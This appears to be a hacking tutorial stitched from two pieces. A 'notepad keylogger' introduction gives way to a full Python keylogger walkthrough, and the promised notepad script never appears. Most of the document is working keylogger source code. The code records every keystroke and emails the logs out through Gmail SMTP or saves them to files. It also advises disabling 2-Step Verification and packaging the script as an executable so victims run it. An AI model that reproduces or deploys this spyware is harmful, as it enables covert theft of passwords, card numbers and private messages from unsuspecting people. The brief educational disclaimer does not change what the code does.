# KEYLOGGER


How To Create A Keylogger Using Notepad
The keylogger is one of the oldest tools in the world of hacking, but despite this, it is still effective. Next, I’ll write everything you need to know about keyloggers and I’ll also show you how to create one in a simple way, using nothing more than the notepad.
What Is Keylogger?
A keylogger is a type of spyware that records all keystrokes on victims computer secretly. Keyloggers are widely used by cybercriminals to obtain information on bank accounts and credit cards, data such as usernames, passwords, and other personal information.

After recording everything that is typed by the victim, it sends the file where all the data was saved to the server that was operated by the hacker.
How To Make A Keylogger?
Here is a basic keylogger script for beginners to understand the basics of how keylogging works in notepad. This script should only be used for research purposes.

===================================================================

1) Open notepad on your Windows operating system and then paste the script given below.
 A keylogger is a type of surveillance technology used to monitor and record each keystroke typed on a specific computer's keyboard. In this tutorial, you will learn how to write a keylogger in Python.

You are maybe wondering, why a keylogger is useful ? Well, when a hacker (or a script kiddie) uses this for unethical purposes, he/she will register everything you type in the keyboard including your credentials (credit card numbers, passwords, etc.).

The goal of this tutorial is to make you aware of these kind of scripts as well as learning how to implement such malicious scripts on your own for educational purposes, let's get started!

Related: How to Make a Port Scanner in Python.

First, we gonna need to install a module called keyboard, go to the terminal or the command prompt and write:

pip3 install keyboard

This module allows you to take full control of your keyboard, hook global events, register hotkeys, simulate key presses and much more, and it is small module though.

So, the Python script will do the following:

    Listen to keystrokes in the background.
    Whenever a key is pressed and released, we add it to a global string variable.
    Every N minutes, report the content of this string variable either to a local file (to upload to FTP server or Google Drive API) or via email.

Let us start by import the necessary modules:

import keyboard # for keylogs
import smtplib # for sending email using SMTP protocol (gmail)
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer
from datetime import datetime

If you choose to report key logs via email, then you should set up a Gmail account and make sure that:

    Less secure app access is on (we need to enable it because we will log in using smtplib in Python).
    2-Step Verification is off.

Like it is shown in these two figures:

Enabling Less secure app access

Disabling 2-Step Verification

Now let's initialize our parameters:

SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
EMAIL_ADDRESS = "thisisafakegmail"
EMAIL_PASSWORD = "thisisafakepassword"

Note: Obviously, you need to put your correct gmail credentials, otherwise reporting via email won't work.

Setting SEND_REPORT_EVERY to 60 means we report our keylogs every 60 seconds (i.e one minute), feel free to edit this on your needs.

The best way to represent a keylogger is to create a class for it, and each method in this class does a specific task:

class Keylogger:
    def __init__(self, interval, report_method="email"):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method
        # this is the string variable that contains the log of all 
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

We set report_method to "email" by default, which indicates that we'll send keylogs to our email, you'll see how we pass "file" later and it will save it to a local file.

Now, we gonna need to use keyboard's on_release() function that takes a callback that for every KEY_UP event (whenever you release a key in the keyboard), it will get called, this callback takes one parameter which is a KeyboardEvent that have the name attribute , let's implement it:

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        self.log += name

So whenever a key is released, the button pressed is appended to self.log string variable.

If we choose to report our keylogs to a local file, the following methods are responsible for that:

    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

The update_filename() method is simple; we take the recorded datetimes and convert them to a readable string. After that, we construct a filename based on these dates, in which we'll use it for naming our logging files.

Then we gonna need to implement the method that given a message (in this case, key logs), it sends it as an email (head to this tutorial for more information on how this is done):

    def sendmail(self, email, password, message):
        # manages a connection to the SMTP server
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # connect to the SMTP server as TLS mode ( for security )
        server.starttls()
        # login to the email account
        server.login(email, password)
        # send the actual message
        server.sendmail(email, email, message)
        # terminates the session
        server.quit()

The method that reports the keylogs after every period of time:

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            # if you want to print in the console, uncomment below line
            # print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

So we are checking if the self.log variable got something (the user pressed something in that period), if it is the case, then report it by either saving to a local file, or sending as an email.

And then we passed the interval (in this tutorial, I've set it to 1 minute or 60 seconds, feel free to adjust it on your needs) and the function self.report() to Timer() class, and then call the start() method after we set it as a daemon thread.

This way, the method we just implemented sends keystrokes to email or saves it to a local file (based on the report_method) and calls itself recursively each self.interval seconds in separate threads.

Let's define the method that calls the on_release() method:

    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()

For more information about how to use keyboard module, check this tutorial.

This start() method is what we'll use outside the class, as it's the essential method, we use keyboard.on_release() method to pass our previously defined callback() method.

After that, we call our self.report() method that runs on separate thread and finally we use wait() method from keyboard module to block the current thread, so we can exit out of the program by CTRL+C.

We are basically done with the Keylogger class, all we need to do now is to instantiate this class we have just created:

if __name__ == "__main__":
    # if you want a keylogger to send to your email
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    # if you want a keylogger to record keylogs to a local file 
    # (and then send it using your favorite method)
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()

If you want reports via email, then you should uncomment the first instantiation where we have report_method="email". Otherwise, if you want to report keylogs via files into the current directory, then you should use the second one, report_method set to "file".

When you execute the script using email reporting, it will record your keystrokes, after each minute, it will send all logs to the email, give it a try!

Here is what I got in my email after a minute:

Keylogger results

This was actually what I've pressed in my personal keyboard in that period !

When you run it with report_method="file" (default), then you should start seeing log files in the current directory after each minute:
Keylogger log files

And you'll see output something like this in the console:

[+] Saved keylog-2020-12-18-150850_2020-12-18-150950.txt
[+] Saved keylog-2020-12-18-150950_2020-12-18-151050.txt
[+] Saved keylog-2020-12-18-151050_2020-12-18-151150.txt
[+] Saved keylog-2020-12-18-151150_2020-12-18-151250.txt
...

Conclusion

Now you can extend this to send the log files across the network, or you can use Google Drive API to upload them to your drive, or you can even upload them to your FTP server.

Also, since no one will to execute a .py file, you can build this code into an executable using open source libraries such as Pyinstaller.

DISCLAIMER: Note that I'm not responsible for using this code on a computer you don't have permission to, use it at your own risk!
